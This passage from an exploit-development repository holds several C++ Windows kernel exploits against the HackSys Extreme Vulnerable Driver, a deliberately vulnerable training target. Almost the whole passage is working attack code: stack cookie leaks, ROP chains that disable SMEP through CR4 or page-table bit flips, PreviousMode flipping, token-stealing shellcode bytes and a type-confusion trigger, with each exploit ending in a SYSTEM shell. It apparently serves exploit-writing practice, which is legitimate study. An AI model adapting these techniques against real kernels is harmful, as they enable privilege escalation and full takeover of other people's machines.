	printf("[>] Hevd base: %p\n", hevdBase);

	// allocate shellcode memory & copy shellcode into it
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[>] Shellcode @ %p\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	// get .data section to load the stack cookie (GS)
	DWORD dataSectionOffset = getDriverDataSection(driverPath);
	ULONG_PTR dataSection = hevdBase + dataSectionOffset;
	printf("[>] Found .data section @ %p\n", dataSection);
	 
	// read stack cookie from .data section
	QWORD readBuffer = 0;
	ArbitraryReadBuffer arbReadBuf = { 0 };
	arbReadBuf.readAddress = dataSection;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;

	printf("[>] Leaking stack cookie from the .data section\n");
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not read stack cookie (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Could not read stack cookie (readBuffer == 0)\n");
	}
	QWORD stackCookie = readBuffer;
	printf("[>] Stack cookie is: 0x%llx\n", stackCookie);
	
	StackInfo stackInfo = leakStackBase(exploitName);
	printf("  Stack base 0x%llx\n", stackInfo.Base);
	printf("  Stack limit 0x%llx\n", stackInfo.Limit);

	printf("[>] Searching down from stack limit: 0x%llx\n", stackInfo.Limit);
	intptr_t stackSearch = (intptr_t)stackInfo.Limit - 0xff0;
	BOOL foundControlCode = FALSE;
	while (stackSearch < (intptr_t)stackInfo.Limit - 0x10) {
		arbReadBuf.readAddress = stackSearch;
		arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
		resultIOCTL = false;
		resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
		if (!resultIOCTL) {
			printf("[-] Could not read stack (IOCTL failed).\n");
			return -1;
		}
		if (readBuffer == 0x22200B) {
			printf("[*] Found CTL_CODE in the stack at: 0x%llx\n", stackSearch);
			foundControlCode = TRUE;
			break;
		}
		stackSearch += sizeof(intptr_t);
	}
	if (!foundControlCode) {
		printf("[-] Failed finding control code in stack\n");
		return -1;
	}
	QWORD rsp = stackSearch - 0x50 - 0x230 - 0x28; // from reversing
	printf("[>] RSP that get xored with stack cookie at BufferOverflowGS_internal should be: 0x%llx\n", rsp);
	QWORD xoredCookie = rsp ^ stackCookie;
	printf("[>] Xored cookie is: 0x%llx\n", xoredCookie);

	// Use PTE Method to Flip U/S
	uintptr_t readAddress = (uintptr_t)ntBase + MiGetPteAddressOffset + 0x13;
	arbReadBuf.readAddress = readAddress;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
	printf("[>] Getting PteBase value\n");
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not get PteBase (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Failed getting PteBase (readBuffer == 0)!\n");
		return -1;
	}
	printf("[>] Got PteBase: 0x%llx\n", readBuffer);
	QWORD pteBase = readBuffer;

	uintptr_t shellcodePte = getPteAddress(sc_ptr, (PVOID)pteBase);
	printf("[>] Shellcode at: 0x%llx\n", sc_ptr);
	printf("[>] Got PteAddress of shellcode: 0x%llx\n", shellcodePte);

	// Read the PTE data, flip the user bit and write it back
	readBuffer = 0;
	arbReadBuf.readAddress = shellcodePte;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not get PteData (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Failed getting PteData (readBuffer == 0)!\n");
		return -1;
	}
	printf("[>] PTE Data of shellcode: 0x%llx\n", readBuffer);
	_mm_clflush(&sc_ptr);

	// Reset the User bit to zero (supervisor mode)
	QWORD wantedPteValue = readBuffer & ~0x4;

	// rop chain to disable smep with updated PteValue
	int offset = 512;
	BYTE uBuffer[616] = { 'A' };
	*(QWORD*)(uBuffer + offset) = xoredCookie;
	*(QWORD*)(uBuffer + 568) = (QWORD) (ntBase + POP_RCX);
	*(QWORD*)(uBuffer + 576) = (QWORD) shellcodePte;
	*(QWORD*)(uBuffer + 584) = (QWORD) (ntBase + POP_RAX);
	*(QWORD*)(uBuffer + 592) = (QWORD) wantedPteValue;
	*(QWORD*)(uBuffer + 600) = (QWORD) (ntBase + MOV_RAX_TO_PTR_RCX);
	*(QWORD*)(uBuffer + 608) = (QWORD) (ntBase + JUST_RET);

	sprayTLBCache(); // sometimes required to make U/S stick

	// this will "fail" but still do what we want
	DeviceIoControl(hDriver, IOCTL(0x801), (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);
	printf("[>] Disabled SMEP\n");

	// send shellcode
    *(QWORD*)(uBuffer + 568) = (QWORD)(sc_ptr);
	DeviceIoControl(hDriver, IOCTL(0x801), (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);
	printf("[>] Starting shell\n");
	system("cmd.exe");

	return 0;
}

```

`windows-exploits/HevdStackOverflowMI.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"
#include "Gadgets.h"

/*
   HEVD Stack Overflow / Medium Integrity
   
   Author: @xct_de
   Target: 10.0.19044
   
   SMEP Bypass via ROP/CR4 & Token Stealing Bait Shellcode
*/

int HevdStackOverflowMI(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("  Running HevdStackOverflowMI  \n");
	printf("~-----------------------------~\n");

	DWORD OFFSET = 2072;
	ResolveGadgets();

	// ACL Editing Shellcode

	// TokenStealingBail Shellcode
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] NT base: %llx\n", ntBase);

	// allocate shellcode memory & copy shellcode into it
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] SC @ %p\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	int offset = 2072;
	BYTE uBuffer[2104] = { 'A' };

	QWORD *rop = (QWORD*)(uBuffer + offset);
	int index = 0;
	// bypass SMEP via ROP & finish with sc ptr
	printf("%llx\n", ntBase + kernelGadgets["POP_RCX"]);
	getchar();
	*(rop + index++) = ntBase + kernelGadgets["POP_RCX"];
	*(rop + index++) = 0x50ef8; // rcx value with 20th bit zeroed out
	*(rop + index++) = ntBase + kernelGadgets["MOV_CR4_RCX"];
	*(rop + index++) = (QWORD) sc_ptr;

	// trigger
	DWORD IoControlCode = 0x222003;
	BOOL triggerIOCTL = DeviceIoControl(hDriver, IoControlCode, (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);

	printf("[>] Enjoy your shell!\n");

	system("cmd.exe");
    return 0;
}

```

`windows-exploits/HevdStackOverflowRopMI.cpp`:

```cpp
#include "Common.h"
#include "Gadgets.h"
#include "Exploits.h"

/*
   HEVD Stack Overflow / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   Kernel ROP Playground

   Debugging:
   ba e1 hevd+0x865A9
   ba e1 hevd+0x866BF
   g

   == Common ROP Chains ==
	1. Resolve & call NtProtectVirtualMemory to make kernel memory we know where it is executeable
	   * GetModuleHandle, GetProcAddress, NtProtectVirtualMemory, Restore Execution Flow
	2. Resolve & call WriteProcessMemory to write sc to non writeable page (it uses VirtualProtect internally)
	   * GetModuleHandle, GetProcAddress, WriteProcessMemory, Restore Execution Flow
	3. Flip PreviousMode in _KTHREAD to make this a Kernel Thread (used here)
	   * Find KThread, Write 0 into kThread +0x232 (get offset via WinDBG), Restore Execution Flow

	Resources
	- https://acru3l.github.io/2018/10/20/ropping-through-shady-corners/
	- https://research.nccgroup.com/2021/08/17/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/
*/

namespace HevdStackOverflowRopMINS {

	const int offset = 2072;
	HANDLE hDriver;

	// this is only possible because previousmode=1
	QWORD arbRead(QWORD where) {
		QWORD readBuffer = 0;
		SIZE_T bytesRet = 0;
		if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)where, (LPVOID)&readBuffer, sizeof(QWORD), &bytesRet)) {
			printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError()); 
		}
		return readBuffer;
	}

	// this is only possible because previousmode=1
	void arbWrite(QWORD where, QWORD what) {
		QWORD whatBuffer = what;
		ULONG bytesRet = 0;
		printf("[>] Writing %llx to %llx\n", what, where);
		getchar();
		/*
		 Ref: http://theevilbit.blogspot.com/2018/08/about-writeprocessmemory.html
		      https://research.nccgroup.com/2021/08/17/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/
		 1. It will check if you the API is being called from the kernel or user space (PreviousMode).
		 2. If you come from user mode, it will perform another check which is verifying the address range you are trying to write to, based on the MmUserProbeAddress variable, which points to the end of the user address space. On x64 machines this is a hardcoded value in the code, so there is no actual variable, as you can see below in IDA.
		 
		 So we can not just write to a kernel page with WriteProcessMemory - NtWriteVirtualMemory does not do this check.
		*/
		_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
		if (!pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)where, &whatBuffer, sizeof(QWORD), NULL)) {
			printf("[!] Error while calling pNtWriteVirtualMemory(): %d\n", GetLastError());
		}
		return;
	}


	void Exploit(int argc, char** argv) {
		hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		BYTE uBuffer[2120] = { 'A' };
		ResolveGadgets();

		// get base address of kernel (only works from medium integrity)
		QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");
		printf("[>] NT base: %llx\n", ntBase);

		PVOID kThread = GetkThread();
		if (!kThread)
		{
			printf("[!] Error while getting KTHREAD address\n");
			exit(1);
		}
		printf("[>] Setting KTHREAD PreviousMode to 1 via StackOverflow & ROP\n");
		int index = 0;
		// 6 gadgets would allow us to ret to the original stack pointer of the calling func (find via reversing/debugging)
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["POP_RAX_POP_RCX"];  index += 1;
		*(QWORD*)(uBuffer + offset + index * 8) = (QWORD)kThread + 0x232;  index += 1;			// KTHREAD.PreviousMode
		*(QWORD*)(uBuffer + offset + index * 8) = 0x0000000000000000; index += 1;				// NULL
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["MOV_RCX_PTRRAX"];  index += 1;
		// at this point we are allowed to read/write from/to kernel memory since we are considered a kernel thread
		// but we still have to restore execution flow	
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["XOR_RAX_RAX"];  index += 1;
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["XOR_ESI_ESI"];  index += 1;

		getchar();
		// trigger
		DeviceIoControl(hDriver, 0x222003, (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);

		/*
		  With previousmode = 0 we can use readprocessmemory / writeprocessmemory for a read / write primitive, which allows to...
		  - U/S flip SMEP bypass
		  - HAL table overwrite into SC
		  - Data Only Attack on Token (*)
		 */

		 // find system EPROCESS & token		
		QWORD systemProc = getSystemEProcess();
		printf("[*] System _EPROCESS: 0x%llx\n", systemProc);
		DWORD currentProcessPid = GetCurrentProcessId();
		//printf("[*] Current Process PID %d\n", currentProcessPid);
		BOOL found = false;
		QWORD cProcess = systemProc;
		DWORD cPid = 0;
		QWORD cTokenPtr = 0;
		while (!found) {
			cProcess = arbRead(cProcess + 0x448); 
			cProcess -= 0x448; 
			cPid = arbRead(cProcess + 0x440);
			cTokenPtr = cProcess + 0x4b8;			
			if (cPid == currentProcessPid) {
				printf("[>] Current Process: %llx (PID: %d, TOKEN_PTR: %llx)\n", cProcess, cPid, cTokenPtr);
				found = true;
				break;
			}
		}
		if (!found) {
			printf("Could not find current process in ActiveProcessLinks\n");
			exit(-1);
		}
		printf("[*] Replacing Token\n");		
		arbWrite(cProcess + 0x4b8, arbRead(systemProc + 0x4b8));

		// we can not launch a system process with previous mode still set to zero! (nt!PspLocateInPEManifest+0xa9)
		// so we have to flip it back
		printf("[>] Setting KTHREAD PreviousMode to 0\n");
		index = 0;
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["POP_RAX_POP_RCX"];  index += 1;
		*(QWORD*)(uBuffer + offset + index * 8) = (QWORD)kThread + 0x232;  index += 1;			// KTHREAD.PreviousMode
		*(QWORD*)(uBuffer + offset + index * 8) = 0x0000000000000001; index += 1;				// 1
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["MOV_RCX_PTRRAX"];  index += 1;
		// at this point we are allowed to read/write from/to kernel memory since we are considered a kernel thread
		// but we still have to restore execution flow	
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["XOR_RAX_RAX"];  index += 1;
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["XOR_ESI_ESI"];  index += 1;
		// trigger
		DeviceIoControl(hDriver, 0x222003, (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);

		printf("[>] Enjoy your shell!\n");
		system("cmd.exe");
	}
}

int HevdStackOverflowRopMI(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("      HevdStackOverflowMI      \n");
	printf("~-----------------------------~\n");
	HevdStackOverflowRopMINS::Exploit(argc, argv);
	return 0;
}

```

`windows-exploits/HevdTypeConfusionMI.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"

/*
   HEVD Type Confusion / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   This type confusion essentially just executes at a addr we give it. This version "cheats" and uses the Read/Write PTE method to do disable SMEP.

   Debug: 
   ba e1 HEVD!TypeConfusionObjectInitializer+0x37
   ba e1 HEVD!TriggerArbitraryWrite
*/

int HevdTypeConfusionMI(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("  Running HevdTypeConfusionMI  \n");
	printf("~-----------------------------~\n");

	DWORD MiGetPteAddressOffset = 0x221ef0;
	BOOL resultIOCTL = false;

	typedef struct _TypeConfBuffer
	{
		uintptr_t junkClientID;
		uintptr_t controllableFunc;
	} TypeConfBuffer;

	typedef struct _ArbitraryReadBuffer
	{
		uintptr_t readAddress;
		uintptr_t outBuf;
	} ArbitraryReadBuffer;

	typedef struct _WriteWhatWhereBuffer
	{
		uintptr_t what;
		uintptr_t where;
	} WriteWhatWhereBuffer;


	// TokenStealingBail Shellcode
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[+] NT base: %llx\n", ntBase);

	// sc buffer
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] Shellcode: %llx\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	// use pte U/S method to flip SMEP off via write primitive (yes this is cheating, but I could not find a reliable stack pivot in this windows version)
	// read pte address using arb. read
	printf("[*] Disabling SMEP\n");
	ULONGLONG readBuffer = 0;
	ArbitraryReadBuffer arbReadBuf = { 0 };
	uintptr_t readAddress = (uintptr_t)ntBase + MiGetPteAddressOffset + 0x13;
	arbReadBuf.readAddress = readAddress;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not get PteBase (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Failed getting PteBase (readBuffer == 0)!\n");
		return -1;
	}
	printf("  [+] PteBase: 0x%llx\n", readBuffer);
	ULONGLONG pteBase = readBuffer;

	uintptr_t shellcodePte = getPteAddress(sc_ptr, (PVOID)pteBase);
	printf("  [+] PteAddress of Shellcode: 0x%llx\n", shellcodePte);

	// read pte value using arb. read
	readBuffer = { 0 };
	arbReadBuf.readAddress = shellcodePte;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not get PteData (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Failed getting PteData (readBuffer == 0)!\n");
		return -1;
	}
	printf("  [+] PTE Data of Shellcode: 0x%llx\n", readBuffer);
	_mm_clflush(&sc_ptr);
	
	// write back using arb. write
	readBuffer = readBuffer & ~0x4;
	_WriteWhatWhereBuffer arbWriteBuf = { 0 };
	arbWriteBuf.what = (ULONG_PTR)&readBuffer;
	arbWriteBuf.where = shellcodePte;
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbWriteBuf, sizeof(arbWriteBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not write new PTE Data (IOCTL failed).\n");
		return -1;
	}
	printf("[+] SMEP disabled\n");
	
	// exploit type confusion, will execute our stack_pivot & return into the fake stack
	TypeConfBuffer tcBuf = { 0 };
	tcBuf.junkClientID = 0xAABBCCDDEEFFEEDD;
	tcBuf.controllableFunc = (ULONG_PTR) sc_ptr;

	printf("\n[*] Press enter to exploit...\n");
	getchar();

	DeviceIoControl(hDriver, IOCTL(0x808), &tcBuf, sizeof(tcBuf), NULL, 0, NULL, NULL);
	system("cmd.exe");
	return 0;
}
```

`windows-exploits/HevdTypeConfusionMI2.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"

/*
   HEVD Type Confusion / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   This type confusion essentially just executes at a addr we give it. We pivot the stack & use to ROP to disable SMEP.

   Debug: 
   ba e1 HEVD!TypeConfusionObjectInitializer+0x37
   dq rbx+8
   bp ...
*/

int HevdTypeConfusionMI2(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("  Running HevdTypeConfusionMI  \n");
	printf("~-----------------------------~\n");

	// static gadgets, adjust for other kernel version
	DWORD STACK_PIVOT = 0x5988ce; //0x1405988ce: mov esp, 0x83000000 ; ret ;
	QWORD STACK_PIVOT_ADDR = 0x83000000;
	DWORD MOV_CR4_RCX = 0x514999;
	DWORD POP_RCX = 0x99710c;

	BOOL resultIOCTL = false;

	typedef struct _TypeConfBuffer
	{
		uintptr_t junkClientID;
		uintptr_t controllableFunc;
	} TypeConfBuffer;

	
	// TokenStealingBail Shellcode
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] NT base: %llx\n", ntBase);

	// sc buffer
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[>] Shellcode: %llx\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	// fake stack buffer
	DWORD stack_addr = STACK_PIVOT_ADDR - 0x1000;
	printf("[*] Allocating fake stack @ %llx\n", stack_addr);
	LPVOID stack_ptr = VirtualAlloc((LPVOID)stack_addr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("[>] Fake Stack: %llx\n", stack_ptr);
	
	printf("Press enter to continue..\n");
	getchar();

	// push & read some values in the fake stack region to make sure its paged
	int step = 0x800;
	for (int i = 0; i <= 0x15000/ step; i++) {
		*(QWORD*)((QWORD)stack_ptr + i * step) = 0xdeadc0de;
		printf("  %llx %llx\n", (QWORD)stack_ptr + i * step, *(QWORD*)((QWORD)stack_ptr + i * step));
		*(QWORD*)((QWORD)stack_ptr + i * step) = 0x0;
	}	

